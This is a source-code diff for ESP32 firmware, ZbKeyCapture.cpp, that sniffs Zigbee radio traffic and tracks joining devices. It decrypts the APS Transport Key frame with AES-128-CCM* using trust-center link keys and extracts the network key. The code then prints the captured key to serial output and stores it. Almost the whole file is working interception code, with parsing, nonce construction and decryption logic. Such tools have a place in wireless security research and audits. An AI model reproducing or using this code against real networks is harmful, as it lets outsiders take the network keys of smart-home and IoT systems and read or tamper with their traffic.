@@ -1,31 +1,28 @@
 /*
- * ZbKeyCapture.cpp - Zigbee Network Key interception
+ * ZbKeyCapture.cpp — Zigbee Network Key interception
  *
- * AES-128-CCM* decryption using mbedtls (included in ESP32 Arduino core)
+ * Transport Key frame structure during join:
+ *   NWK layer: UNENCRYPTED (zbNwkSecurityEnabled = 0)
+ *   APS layer: ENCRYPTED with TCLK (AES-128-CCM*)
  *
- * CCM* nonce construction (13 bytes, per Zigbee spec 4.5.1):
- *   Source EUI64 (8 bytes, little-endian from AUX header)
- *   Frame counter (4 bytes, little-endian from AUX header)
- *   Security control byte (1 byte, from AUX header)
+ * APS security aux header (embedded in APS payload):
+ *   APS FC (1) | APS Aux Sec: secCtrl(1)+fc(4)+[extSrc(8)]+keySeq(1) | ciphertext | MIC(4)
  *
- * Additional auth data (AAD) = everything before the encrypted payload:
- *   MAC header + NWK header + NWK AUX security header
- *   (excludes the MIC at the end)
+ * CCM* nonce (13 bytes, Zigbee spec 4.5.1):
+ *   src EUI64 (8, LE) | frame counter (4, LE) | sec ctrl byte (1)
+ *
+ * AAD for APS-layer decryption:
+ *   NWK header + APS FC byte (everything before the APS AUX security header)
  */
 
 #include "ZbKeyCapture.h"
-
-// mbedtls CCM - included in ESP32 Arduino core
 #include "mbedtls/ccm.h"
 
-// -- APS layer constants -------------------------------------------------------
 #define APS_CMD_TRANSPORT_KEY   0x05
 #define APS_KEY_TYPE_NWK        0x01
-#define APS_KEY_TYPE_TCLK       0x04
+#define ZB_MIC_LEN              4
 
-// AUX security header security level - MIC-32 with encryption
-#define ZB_SEC_LEVEL_ENC_MIC32  0x05
-#define ZB_MIC_LEN              4    // MIC-32 = 4 bytes
+uint64_t _coordinatorEUI64 = 0;
 
 ZbKeyCapture::ZbKeyCapture(IEEE802154Sniffer &sniffer)
     : _sniffer(sniffer), onKeyCapture(nullptr)
@@ -33,39 +30,36 @@ ZbKeyCapture::ZbKeyCapture(IEEE802154Sniffer &sniffer)
     memset(_joins, 0, sizeof(_joins));
 }
 
+
+
 // -- Public --------------------------------------------------------------------
 
 bool ZbKeyCapture::processFrame(const FrameInfo &info,
                                  const uint8_t *rawFrame, uint8_t rawLen,
                                  uint8_t macPayloadOffset) {
 
-        // Temporary debug — remove after confirming calls
-    if (info.frameType == FC_FRAME_TYPE_DATA && info.zbNwkSecurityEnabled)
-        Serial.printf("[KC] encrypted data from 0x%04X→0x%04X nwkSrc=0x%04X\n",
-                          info.macSrc, info.macDst, info.route.nwkSrc);
-
- // Debug
-     Serial.printf("[KC] frame type=%u proto=%u zbSec=%d src=0x%04X dst=0x%04X\n",
-                   info.frameType, (uint8_t)info.protocol, info.zbNwkSecurityEnabled,
-                               info.route.nwkSrc, info.route.nwkDst);
-
-
-    // Resolve pending extended-addr join to short addr
-    // First MAC Cmd from new device (Data Request after Assoc Response)
     if (info.frameType == FC_FRAME_TYPE_MAC_CMD) {
+        // Resolve pending extended-addr join to short addr on first MAC cmd
+        // from new device (Data Request right after Assoc Response)
         JoinState *pending = _findJoin(0xFFFE);
         if (pending && info.macSrc != 0xFFFE && !_findJoin(info.macSrc)) {
             pending->shortAddr = info.macSrc;
             Serial.printf("[KeyCapture] Resolved join: EUI64=%016llX → 0x%04X\n",
                           pending->extAddr, info.macSrc);
         }
-        // Check for Association Response
+        // Check for Association Response (MAC cmd 0x02)
         if (rawLen > macPayloadOffset && rawFrame[macPayloadOffset] == 0x02) {
             _handleAssocResponse(info);
         }
         return false;
     }
 
+    if (info.srcExtended != 0 && 
+        (info.macSrc == 0x0000 || info.route.nwkSrc == 0x0000)) {
+            _coordinatorEUI64 = info.srcExtended;
+            }
+
+    // Only Zigbee data frames — NWK layer NOT necessarily encrypted
     if (info.protocol == FrameProtocol::ZIGBEE &&
         info.frameType == FC_FRAME_TYPE_DATA) {
         if (macPayloadOffset >= rawLen) return false;
@@ -76,7 +70,6 @@ bool ZbKeyCapture::processFrame(const FrameInfo &info,
 
     return false;
 }
-
 
 void ZbKeyCapture::expireJoins(uint32_t timeout_ms) {
     uint32_t now = millis();
@@ -90,7 +83,7 @@ void ZbKeyCapture::expireJoins(uint32_t timeout_ms) {
     }
 }
 
-// -- Join state management -----------------------------------------------------
+// -- Join state ----------------------------------------------------------------
 
 JoinState *ZbKeyCapture::_findJoin(uint16_t addr) {
     for (int i = 0; i < MAX_PENDING_JOINS; i++)
@@ -99,7 +92,6 @@ JoinState *ZbKeyCapture::_findJoin(uint16_t addr) {
 }
 
 JoinState *ZbKeyCapture::_allocJoin(uint16_t addr) {
-    // Reuse existing or find free slot
     for (int i = 0; i < MAX_PENDING_JOINS; i++) {
         if (!_joins[i].active) {
             _joins[i].active       = true;
@@ -109,11 +101,10 @@ JoinState *ZbKeyCapture::_allocJoin(uint16_t addr) {
             return &_joins[i];
         }
     }
-    // All full - evict oldest
+    // Evict oldest
     JoinState *oldest = &_joins[0];
     for (int i = 1; i < MAX_PENDING_JOINS; i++)
-        if (_joins[i].assocTime_ms < oldest->assocTime_ms)
-            oldest = &_joins[i];
+        if (_joins[i].assocTime_ms < oldest->assocTime_ms) oldest = &_joins[i];
     oldest->active       = true;
     oldest->shortAddr    = addr;
     oldest->extAddr      = 0;
@@ -121,32 +112,22 @@ JoinState *ZbKeyCapture::_allocJoin(uint16_t addr) {
     return oldest;
 }
 
-void ZbKeyCapture::_freeJoin(JoinState *j) {
-    if (j) j->active = false;
-}
+void ZbKeyCapture::_freeJoin(JoinState *j) { if (j) j->active = false; }
 
-// -- Association Response handler ----------------------------------------------
+// -- Association Response ------------------------------------------------------
 
 void ZbKeyCapture::_handleAssocResponse(const FrameInfo &info) {
-    // Association Response is from coordinator (0x0000) to joining device
-    // The joining device may be addressed by short OR extended address at this stage
-    // if (info.macSrc != 0x0000) return;
-
+    // Assoc Response comes from router (not necessarily coordinator)
+    // Device may be addressed by EUI64 (extended addr mode) before getting short addr
     JoinState *j;
     if (info.dstAddrMode == ADDR_MODE_EXTENDED) {
-        // Device addressed by EUI64 — store EUI64, short addr unknown yet
-        // Use lower 16 bits of EUI64 as temporary key (will match on NWK dst later)
-        uint16_t tempKey = (uint16_t)(info.dstExtended & 0xFFFF);
-        j = _allocJoin(tempKey);
+        j = _allocJoin(0xFFFE);           // placeholder until Data Request reveals short addr
         j->extAddr = info.dstExtended;
-        j->shortAddr = 0xFFFE;  // mark as unknown
-        Serial.printf("[KeyCapture] Join (ext addr): EUI64=%016llX\n",
-                      info.dstExtended);
+        Serial.printf("[KeyCapture] Join (ext addr): EUI64=%016llX\n", info.dstExtended);
     } else {
-        // Device addressed by short address
         j = _allocJoin(info.macDst);
         j->extAddr = info.dstExtended;
-        Serial.printf("[KeyCapture] Join detected: 0x%04X (EUI64: %016llX)\n",
+        Serial.printf("[KeyCapture] Join detected: 0x%04X EUI64=%016llX\n",
                       info.macDst, info.dstExtended);
     }
 }
@@ -156,18 +137,11 @@ void ZbKeyCapture::_handleAssocResponse(const FrameInfo &info) {
 bool ZbKeyCapture::_handleTransportKey(const FrameInfo &info,
                                         const uint8_t *nwkPayload,
                                         uint8_t nwkLen) {
-     // Must be unicast
-     if (is_bcast(info.route.nwkDst)) return false;
-             
-    // Must be going to a recently-joined device
+    // Must be unicast to a recently-joined device
+    if (is_bcast(info.route.nwkDst)) return false;
     JoinState *j = _findJoin(info.route.nwkDst);
-    if (!j) return false;  // not a device we're tracking
+    if (!j) return false;
 
-    // Only from coordinator to a recently-joined device
-    // if (info.route.nwkSrc != 0x0000) return false;
-    // if (is_bcast(info.route.nwkDst))  return false;
-
- // Hex dump — remove after debugging
     Serial.printf("[KC] Transport Key candidate: nwkLen=%u nwkSrc=0x%04X dst=0x%04X\n",
                   nwkLen, info.route.nwkSrc, info.route.nwkDst);
     Serial.print("[KC] NWK: ");
@@ -175,38 +149,23 @@ bool ZbKeyCapture::_handleTransportKey(const FrameInfo &info,
         Serial.printf("%02X ", nwkPayload[i]);
     Serial.println();
 
-    // Check if destination recently joined — but try anyway even if missed
-    // JoinState *j = _findJoin(info.route.nwkDst);
-    // if (!j) {
-    //     // Try EUI64-based match for extended-addressed joins
-    //     for (int i = 0; i < MAX_PENDING_JOINS; i++) {
-    //         if (_joins[i].active && _joins[i].shortAddr == 0xFFFE) {
-    //             // Placeholder join from extended-addr association — accept
-    //             j = &_joins[i];
-    //             j->shortAddr = info.route.nwkDst;  // now we know the short addr
-    //             break;
-    //        }
-    //     }
-    // }
-
-    // Log regardless — we attempt decryption even without confirmed join state
-    Serial.printf("[KeyCapture] Coord→0x%04X encrypted — attempting decrypt, nwkLen=%u\n",
-                  info.route.nwkDst, nwkLen);
-
-    // Hex dump first 32 bytes for debugging
-    Serial.print("[KeyCapture] NWK: ");
-    for (uint8_t i = 0; i < min((uint8_t)32, nwkLen); i++)
-        Serial.printf("%02X ", nwkPayload[i]);
-    Serial.println();
-
-    // Find APS payload offset (after NWK header + AUX security header)
+    // Navigate NWK header to find APS payload
     uint8_t apsOffset = 0;
     if (!_skipNwkHeader(nwkPayload, nwkLen, apsOffset)) {
-        Serial.println("[KeyCapture] Could not parse NWK header");
+        Serial.println("[KC] Could not parse NWK header");
         return false;
     }
+    Serial.printf("[KC] apsOffset=%u\n", apsOffset);
 
-    Serial.printf("[KeyCapture] nwkLen=%u apsOffset=%u\n", nwkLen, apsOffset);
+    if (apsOffset >= nwkLen) return false;
+
+    // Parse APS FC byte to determine if APS-secured
+    uint8_t apsFc = nwkPayload[apsOffset];
+    uint8_t apsFrameType   = apsFc & 0x03;          // bits[1:0]
+    bool    apsSecured     = (apsFc >> 5) & 0x01;   // bit 5
+
+    Serial.printf("[KC] APS FC=0x%02X type=%u secured=%u\n",
+                  apsFc, apsFrameType, apsSecured);
 
     // Try each TCLK we have
     for (int ki = 0; ki < _sniffer.keys.size(); ki++) {
@@ -215,22 +174,31 @@ bool ZbKeyCapture::_handleTransportKey(const FrameInfo &info,
 
         uint8_t plaintext[64] = {};
         uint8_t plaintextLen  = 0;
+        bool ok = false;
 
-        if (!_decryptNwkPayload(nwkPayload, nwkLen, apsOffset,
-                                 k->key, plaintext, plaintextLen)) {
-            continue;  // wrong key or bad MIC - try next
+        if (apsSecured) {
+            uint64_t coordEUI64 = 0;
+            HostRecord *coord = _sniffer.findHost(0x0000);
+            if (coord) coordEUI64 = coord->extAddr;
+            Serial.printf("[KC] coordEUI64=%016llX\n", coordEUI64);
+            ok = _decryptApsPayload(nwkPayload, nwkLen, apsOffset,
+                                     k->key, coordEUI64,
+                                     plaintext, plaintextLen);
+        } else if (info.zbNwkSecurityEnabled) {
+            ok = _decryptNwkPayload(nwkPayload, nwkLen, apsOffset,
+                                     k->key, plaintext, plaintextLen);
         }
 
-        // Decryption succeeded - parse APS Transport Key
+        if (!ok) continue;
+
+        // Parse the decrypted APS payload
         uint8_t networkKey[ZIGBEE_KEY_LEN] = {};
         uint8_t keySeqNum = 0;
-
         if (!_parseTransportKey(plaintext, plaintextLen, networkKey, keySeqNum)) {
-            Serial.println("[KeyCapture] APS parse failed after successful decrypt");
+            Serial.println("[KC] APS parse failed after decrypt");
             continue;
         }
 
-        // Got the network key!
         Serial.printf("[KeyCapture] *** Network key captured! seq=%u ***\n", keySeqNum);
         Serial.print("[KeyCapture] Key: ");
         for (int i = 0; i < ZIGBEE_KEY_LEN; i++)
@@ -239,8 +207,7 @@ bool ZbKeyCapture::_handleTransportKey(const FrameInfo &info,
         char label[16];
         snprintf(label, sizeof(label), "NWK-seq%u", keySeqNum);
         _sniffer.addKey(ZbKeyType::NETWORK, networkKey, keySeqNum, label);
-
-        if (j) _freeJoin(j);
+        _freeJoin(j);
 
         if (onKeyCapture) {
             ZbKey *captured = _sniffer.findNetworkKey(keySeqNum);
@@ -249,21 +216,20 @@ bool ZbKeyCapture::_handleTransportKey(const FrameInfo &info,
         return true;
     }
 
-    Serial.printf("[KeyCapture] Could not decrypt Transport Key for 0x%04X "
-                  "(no matching TCLK or not Transport Key)\n",
-                  info.route.nwkDst);
+    Serial.printf("[KC] Decrypt failed for 0x%04X\n", info.route.nwkDst);
     return false;
 }
 
-// -- Skip NWK header to find AUX security header offset -----------------------
+// -- Skip NWK header → apsOffset points to APS payload ------------------------
+
 bool ZbKeyCapture::_skipNwkHeader(const uint8_t *p, uint8_t len,
                                    uint8_t &apsOffset) {
     if (len < 8) return false;
 
     uint16_t nwkFc = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
-    uint8_t off = 8;  // fixed NWK header: FC(2) + dst(2) + src(2) + radius(1) + seq(1)
+    uint8_t off = 8;  // FC(2)+dst(2)+src(2)+radius(1)+seq(1)
 
-    // Optional multicast control
+    // Optional multicast control (bit 8 of FC high byte)
     if ((nwkFc >> 8) & 0x01) { if (off + 1 > len) return false; off++; }
 
     // Optional extended destination
@@ -280,66 +246,77 @@ bool ZbKeyCapture::_skipNwkHeader(const uint8_t *p, uint8_t len,
         if (off > len) return false;
     }
 
-    // NWK security bit must be set
-    // if (!((nwkFc >> 1) & 0x01)) return false;
+    // If NWK security is set, skip the NWK AUX security header too
+    bool nwkSec = (nwkFc >> 1) & 0x01;
+    if (nwkSec) {
+        // AUX header: secCtrl(1)+fc(4)+[extSrc(8)]+keySeq(1)
+        if (off + 6 > len) return false;
+        uint8_t secCtrl = p[off];
+        bool hasExtSrc = (secCtrl >> 6) & 0x01;
+        off += 6;                        // secCtrl + fc + keySeq
+        if (hasExtSrc) { if (off + 8 > len) return false; off += 8; }
+    }
 
-    // AUX security header starts here
     apsOffset = off;
     return true;
 }
 
-// -- Decrypt NWK payload using AES-128-CCM* -----------------------------------
-bool ZbKeyCapture::_decryptNwkPayload(const uint8_t *frame, uint8_t frameLen,
+// -- APS-layer decryption ------------------------------------------------------
+// Called when APS FC bit 5 (security) is set.
+// Structure at nwkPayload[apsOffset]:
+//   APS FC (1) | APS AUX: secCtrl(1)+fc(4)+[extSrc(8)]+keySeq(1) | ciphertext | MIC(4)
+bool ZbKeyCapture::_decryptApsPayload(const uint8_t *nwkPayload, uint8_t nwkLen,
                                        uint8_t apsOffset,
                                        const uint8_t *key,
+                                       uint64_t knownExtSrc,
                                        uint8_t *plaintextOut,
                                        uint8_t &plaintextLen) {
-    // AUX security header layout:
-    //   sec_ctrl (1) | frame_counter (4) | [ext_src (8)] | key_seq (1)
-    const uint8_t *aux = &frame[apsOffset];
-    uint8_t remaining = frameLen - apsOffset;
-    if (remaining < 6) return false;
 
-    uint8_t  secCtrl    = aux[0];
+    // APS FC is at apsOffset — APS AUX header starts at apsOffset+1
+    uint8_t auxStart = apsOffset + 1;
+    if (auxStart + 6 > nwkLen) return false;
+
+    const uint8_t *aux = &nwkPayload[auxStart];
+    uint8_t secCtrl = aux[0];
     uint32_t frameCounter = (uint32_t)aux[1] | ((uint32_t)aux[2] << 8) |
                             ((uint32_t)aux[3] << 16) | ((uint32_t)aux[4] << 24);
-    bool     hasExtSrc  = (secCtrl >> 6) & 0x01;
-    uint8_t  secLevel   = secCtrl & 0x07;
+    bool hasExtSrc = (secCtrl >> 6) & 0x01;
 
     uint8_t auxOff = 5;
     uint8_t srcEui64[8] = {};
+
     if (hasExtSrc) {
-        if (auxOff + 8 > remaining) return false;
+        if (auxOff + 8 > (nwkLen - auxStart)) return false;
         memcpy(srcEui64, &aux[auxOff], 8);
         auxOff += 8;
-    } else {
-        // No extended src in AUX - may need to get it from NWK extended src field
-        // For now leave as zeros (will cause MIC mismatch if required)
+    } else if (knownExtSrc != 0) {
+        // Use EUI64 from join state (coordinator's EUI64)
+        memcpy(srcEui64, &knownExtSrc, 8);
     }
+    // keySeq
+    if (auxOff + 1 > (nwkLen - auxStart)) return false;
+    auxOff++;  // skip keySeq
 
-    if (auxOff + 1 > remaining) return false;
-    // uint8_t keySeqNum = aux[auxOff];
-    auxOff++;
+    // Ciphertext starts after AUX header, ends before MIC
+    uint8_t encStart = auxStart + auxOff;
+    if (encStart + ZB_MIC_LEN >= nwkLen) return false;
+    uint8_t encLen = nwkLen - encStart - ZB_MIC_LEN;
+    if (encLen > 63) return false;
 
-    // Encrypted payload starts after AUX header, ends before MIC
-    uint8_t encOffset = apsOffset + auxOff;
-    if (encOffset + ZB_MIC_LEN >= frameLen) return false;
-    uint8_t encLen    = frameLen - encOffset - ZB_MIC_LEN;
-    const uint8_t *ciphertext = &frame[encOffset];
-    const uint8_t *mic        = &frame[frameLen - ZB_MIC_LEN];
+    const uint8_t *ciphertext = &nwkPayload[encStart];
+    const uint8_t *mic        = &nwkPayload[nwkLen - ZB_MIC_LEN];
 
-    // Build CCM* nonce (13 bytes):
-    //   src EUI64 (8, LE) | frame counter (4, LE) | sec ctrl (1)
+    // Nonce: srcEUI64(8) + frameCounter(4,LE) + secCtrl(1)
     uint8_t nonce[13];
-    memcpy(nonce,     srcEui64, 8);
-    memcpy(nonce + 8, &aux[1],  4);  // frame counter little-endian
+    memcpy(nonce, srcEui64, 8);
+    nonce[8]  = aux[1]; nonce[9]  = aux[2];
+    nonce[10] = aux[3]; nonce[11] = aux[4];
     nonce[12] = secCtrl;
 
-    // AAD = everything from start of frame to start of ciphertext
-    const uint8_t *aad    = frame;
-    uint8_t        aadLen = encOffset;
-
-    if (encLen > 63) return false;
+    // AAD = NWK header + APS FC byte (everything before APS AUX header)
+    // i.e. nwkPayload[0..apsOffset] inclusive
+    const uint8_t *aad = nwkPayload;
+    uint8_t aadLen = auxStart;  // up to but not including the AUX header
 
     bool ok = _ccmDecrypt(key, nonce, aad, aadLen,
                            ciphertext, encLen,
@@ -348,60 +325,97 @@ bool ZbKeyCapture::_decryptNwkPayload(const uint8_t *frame, uint8_t frameLen,
     return ok;
 }
 
-// -- AES-128-CCM* decryption via mbedtls --------------------------------------
+// -- NWK-layer decryption (fallback) ------------------------------------------
+
+bool ZbKeyCapture::_decryptNwkPayload(const uint8_t *frame, uint8_t frameLen,
+                                       uint8_t apsOffset,
+                                       const uint8_t *key,
+                                       uint8_t *plaintextOut,
+                                       uint8_t &plaintextLen) {
+    const uint8_t *aux = &frame[apsOffset];
+    uint8_t remaining = frameLen - apsOffset;
+    if (remaining < 6) return false;
+
+    uint8_t  secCtrl      = aux[0];
+    uint32_t frameCounter = (uint32_t)aux[1] | ((uint32_t)aux[2] << 8) |
+                            ((uint32_t)aux[3] << 16) | ((uint32_t)aux[4] << 24);
+    bool hasExtSrc = (secCtrl >> 6) & 0x01;
+
+    uint8_t auxOff = 5;
+    uint8_t srcEui64[8] = {};
+    if (hasExtSrc) {
+        if (auxOff + 8 > remaining) return false;
+        memcpy(srcEui64, &aux[auxOff], 8);
+        auxOff += 8;
+    }
+    if (auxOff + 1 > remaining) return false;
+    auxOff++;  // keySeq
+
+    uint8_t encOffset = apsOffset + auxOff;
+    if (encOffset + ZB_MIC_LEN >= frameLen) return false;
+    uint8_t encLen = frameLen - encOffset - ZB_MIC_LEN;
+    if (encLen > 63) return false;
+
+    const uint8_t *ciphertext = &frame[encOffset];
+    const uint8_t *mic        = &frame[frameLen - ZB_MIC_LEN];
+
+    uint8_t nonce[13];
+    memcpy(nonce, srcEui64, 8);
+    memcpy(nonce + 8, &aux[1], 4);
+    nonce[12] = secCtrl;
+
+    bool ok = _ccmDecrypt(key, nonce, frame, encOffset,
+                           ciphertext, encLen,
+                           plaintextOut, mic, ZB_MIC_LEN);
+    if (ok) plaintextLen = encLen;
+    return ok;
+}
+
+// -- AES-128-CCM* via mbedtls --------------------------------------------------
+
 bool ZbKeyCapture::_ccmDecrypt(const uint8_t *key,
                                 const uint8_t *nonce,
-                                const uint8_t *aad,   uint8_t aadLen,
-                                const uint8_t *ct,    uint8_t ctLen,
+                                const uint8_t *aad,    uint8_t aadLen,
+                                const uint8_t *ct,     uint8_t ctLen,
                                 uint8_t       *pt,
-                                const uint8_t *mic,   uint8_t micLen) {
+                                const uint8_t *mic,    uint8_t micLen) {
     mbedtls_ccm_context ctx;
     mbedtls_ccm_init(&ctx);
 
     int ret = mbedtls_ccm_setkey(&ctx, MBEDTLS_CIPHER_ID_AES, key, 128);
-    if (ret != 0) {
-        mbedtls_ccm_free(&ctx);
-        return false;
-    }
+    if (ret != 0) { mbedtls_ccm_free(&ctx); return false; }
 
-    // mbedtls ccm_auth_decrypt: ciphertext includes appended tag in some versions
-    // Use ccm_star_auth_decrypt for CCM* (no length encoding in flags)
     ret = mbedtls_ccm_star_auth_decrypt(&ctx,
-                                         ctLen,
-                                         nonce, 13,
+                                         ctLen, nonce, 13,
                                          aad, aadLen,
-                                         ct,
-                                         pt,
+                                         ct, pt,
                                          mic, micLen);
-
     mbedtls_ccm_free(&ctx);
     return (ret == 0);
 }
 
-// -- Parse APS Transport Key payload ------------------------------------------
+// -- Parse decrypted APS Transport Key ----------------------------------------
+
 bool ZbKeyCapture::_parseTransportKey(const uint8_t *aps, uint8_t apsLen,
                                        uint8_t *networkKeyOut,
                                        uint8_t &seqNumOut) {
-    // APS frame control (1) + cluster ID (2, for data) OR
-    // APS FC (1) + cmd ID (1) for command frames
-    // For APS command frames: FC bits[1:0] = 01 (command)
     if (apsLen < 2) return false;
 
-    uint8_t apsFc  = aps[0];
+    uint8_t apsFc        = aps[0];
     uint8_t apsFrameType = apsFc & 0x03;
 
-    // We expect APS command frame (type = 0x01)
+    // APS command frame type = 0x01
     if (apsFrameType != 0x01) return false;
 
     uint8_t cmdId = aps[1];
     if (cmdId != APS_CMD_TRANSPORT_KEY) return false;
 
-    // Transport Key payload: key_type(1) + key(16) + seq(1) + dst_eui64(8) + src_eui64(8)
-    if (apsLen < 2 + 1 + 16 + 1 + 8 + 8) return false;
+    // key_type(1) + key(16) + seq(1) + dst_eui64(8) + src_eui64(8) = 34 bytes
+    if (apsLen < 2 + 34) return false;
 
     uint8_t keyType = aps[2];
     if (keyType != APS_KEY_TYPE_NWK) {
-        Serial.printf("[KeyCapture] Transport Key type=0x%02X (not NWK)\n", keyType);
+        Serial.printf("[KC] Transport Key type=0x%02X (not NWK)\n", keyType);
         return false;
     }
 
